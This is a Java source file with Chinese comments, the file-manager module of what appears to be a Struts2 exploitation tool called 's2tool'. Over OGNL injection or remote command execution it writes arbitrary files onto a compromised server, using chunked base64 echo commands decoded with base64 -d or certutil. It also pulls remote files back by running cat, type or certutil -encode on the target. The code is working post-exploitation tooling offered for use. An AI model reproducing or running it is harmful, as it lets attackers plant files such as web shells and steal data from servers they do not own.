package com.s2tool.modules;

import com.s2tool.core.HttpClient;
import com.s2tool.core.HttpResponseData;
import com.s2tool.core.PayloadBuilder;
import com.s2tool.core.Target;
import com.s2tool.utils.Logger;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

/**
 * 文件管理模块：基于命令执行/OGNL 能力实现对目标文件系统的读写。
 *
 * <p><b>上传</b>支持两种方式：
 * <ul>
 *   <li>OGNL 直写（默认，适合 &lt;1MB 文件）：Base64 编码后经 OGNL 写入</li>
 *   <li>命令执行（备选，适合大文件/无 java.util.Base64 环境）：echo 分段 + base64 -d</li>
 * </ul>
 *
 * <p><b>下载</b>支持：
 * <ul>
 *   <li>Base64 编码下载（默认，二进制安全）：cat file | base64 -w 0</li>
 *   <li>直接回显下载（文本文件）：cat file</li>
 * </ul></p>
 */
public class FileManager {

    private static final int CHUNK_SIZE = 4000; // 命令行长限制内单段 base64 长度

    private final HttpClient http;
    private final Target target;
    private final Executor executor;
    private final InfoGather info;

    public FileManager(HttpClient http, Target target) {
        this.http = http;
        this.target = target;
        this.executor = new Executor(http, target);
        this.info = new InfoGather(http, target);
    }

    // ==================== 上传 ====================

    /**
     * 上传本地文件到目标路径。
     *
     * @param localFile 本地文件路径
     * @param remotePath 目标服务器绝对路径
     * @param method "ognl"（直写）或 "cmd"（命令执行）
     * @return 操作结果描述
     */
    public String upload(String localFile, String remotePath, String method) {
        File f = new File(localFile);
        if (!f.exists() || !f.isFile()) {
            return "本地文件不存在: " + localFile;
        }
        byte[] data;
        try {
            data = Files.readAllBytes(f.toPath());
        } catch (IOException e) {
            return "读取本地文件失败: " + e.getMessage();
        }
        if (data.length == 0) {
            return "本地文件为空: " + localFile;
        }
        if ("cmd".equalsIgnoreCase(method)) {
            return uploadViaCommand(data, remotePath);
        }
        return uploadViaOgnl(data, remotePath);
    }

    /**
     * OGNL 直写：Base64 编码后写入（适合小文件）。
     * 若内容过大（> 50KB）自动切换为命令执行方式。
     */
    private String uploadViaOgnl(byte[] data, String remotePath) {
        String b64 = Base64.getEncoder().encodeToString(data);
        if (b64.length() > 50000) {
            Logger.warn("文件较大（" + data.length + " 字节），自动切换为命令执行方式上传");
            return uploadViaCommand(data, remotePath);
        }
        String contentType = PayloadBuilder.writeFilePayload(remotePath, b64);
        HttpResponseData resp = http.post(target.getFullUrl(), contentType,
                target.getCookie(), target.getBasicAuthUser(), target.getBasicAuthPass(),
                null, null);
        if (resp.isConnected() && resp.getBody().contains("S2TOOL_WRITE_OK")) {
            return "上传成功（OGNL 直写）: " + remotePath;
        }
        // OGNL 直写失败，尝试命令执行方式
        Logger.warn("OGNL 直写未确认成功，尝试命令执行方式...");
        return uploadViaCommand(data, remotePath);
    }

    /**
     * 命令执行上传：echo base64 分段写入临时文件 → base64 -d 还原 → 删除临时文件。
     * 自动适配 Linux / Windows。
     */
    private String uploadViaCommand(byte[] data, String remotePath) {
        String os = info.detectOs();
        boolean win = "windows".equals(os);
        String b64 = Base64.getEncoder().encodeToString(data);
        String tmpFile = win ? "%TEMP%\\s2tool_upload.tmp" : "/tmp/.s2tool_upload.tmp";
        String rmCmd = win ? "del /f " + tmpFile : "rm -f " + tmpFile;

        // 分段写入临时文件
        int chunks = (b64.length() + CHUNK_SIZE - 1) / CHUNK_SIZE;
        for (int i = 0; i < chunks; i++) {
            String seg = b64.substring(i * CHUNK_SIZE,
                    Math.min((i + 1) * CHUNK_SIZE, b64.length()));
            String echoCmd;
            if (i == 0) {
                echoCmd = win ? "echo " + seg + " > " + tmpFile : "echo -n " + seg + " > " + tmpFile;
            } else {
                echoCmd = win ? "echo " + seg + " >> " + tmpFile : "echo -n " + seg + " >> " + tmpFile;
            }
            Executor.ExecResult r = executor.exec(echoCmd, 30000);
            if (!r.isSuccess() || (r.getOutput() != null && r.getOutput().contains("command not found"))) {
                return "上传失败（第 " + (i + 1) + "/" + chunks + " 段写入失败）: " + r.getOutput();
            }
        }

        // 解码还原
        String decodeCmd;
        if (win) {
            decodeCmd = "certutil -decode " + tmpFile + " " + remotePath + " >nul 2>&1 && type " + remotePath + " >nul 2>&1 && echo DECODE_OK || echo DECODE_FAIL";
        } else {
            decodeCmd = "cat " + tmpFile + " | base64 -d > " + remotePath + " 2>/dev/null && echo DECODE_OK || echo DECODE_FAIL";
        }
        Executor.ExecResult decode = executor.exec(decodeCmd, 30000);
        if (decode.getOutput() != null && decode.getOutput().contains("DECODE_OK")) {
            executor.exec(rmCmd);
            return "上传成功（命令执行方式, " + chunks + " 段）: " + remotePath;
        }
        executor.exec(rmCmd);
        return "上传失败（base64 解码失败）: " + decode.getOutput();
    }

    // ==================== 下载 ====================

    /**
     * 下载目标文件到本地。
     *
     * @param remotePath 目标服务器文件路径
     * @param localPath 本地保存路径
     * @param method "b64"（Base64，默认）或 "raw"（直接回显）
     */
    public String download(String remotePath, String localPath, String method) {
        String os = info.detectOs();
        boolean win = "windows".equals(os);
        Executor.ExecResult r;
        if ("raw".equalsIgnoreCase(method)) {
            r = executor.exec(win ? "type " + remotePath : "cat " + remotePath, 30000);
            if (r.isSuccess() && !r.getOutput().isEmpty()) {
                try {
                    Files.write(Paths.get(localPath), r.getOutput().getBytes(StandardCharsets.UTF_8));
                    return "下载成功（直接回显）: " + localPath;
                } catch (IOException e) {
                    return "本地写入失败: " + e.getMessage();
                }
            }
            return "下载失败: " + r.getOutput();
        }

        // Base64 编码下载
        String b64Cmd = win
                ? "certutil -encode " + remotePath + " %TEMP%\\s2tool_dl.tmp >nul 2>&1 && type %TEMP%\\s2tool_dl.tmp && del %TEMP%\\s2tool_dl.tmp"
                : "cat " + remotePath + " | base64 -w 0";
        r = executor.exec(b64Cmd, 60000);
        if (!r.isSuccess()) {
            return "下载失败: " + r.getOutput();
        }
        String out = r.getOutput().trim();
        // Windows certutil 输出包含 BEGIN/END 行，提取中间部分
        StringBuilder b64 = new StringBuilder();
        for (String line : out.split("\n")) {
            String t = line.trim();
            if (t.isEmpty() || t.startsWith("-----BEGIN") || t.startsWith("-----END")) {
                continue;
            }
            b64.append(t);
        }
        if (b64.length() == 0) {
            return "下载失败：未获取到文件内容（文件可能不存在）";
        }
        try {
            byte[] data = Base64.getDecoder().decode(b64.toString());
            Files.write(Paths.get(localPath), data);
            return "下载成功（Base64 编码）: " + localPath + " (" + data.length + " 字节)";
        } catch (IllegalArgumentException e) {
            return "Base64 解码失败: " + e.getMessage();
        } catch (IOException e) {
            return "本地写入失败: " + e.getMessage();
        }
    }
}
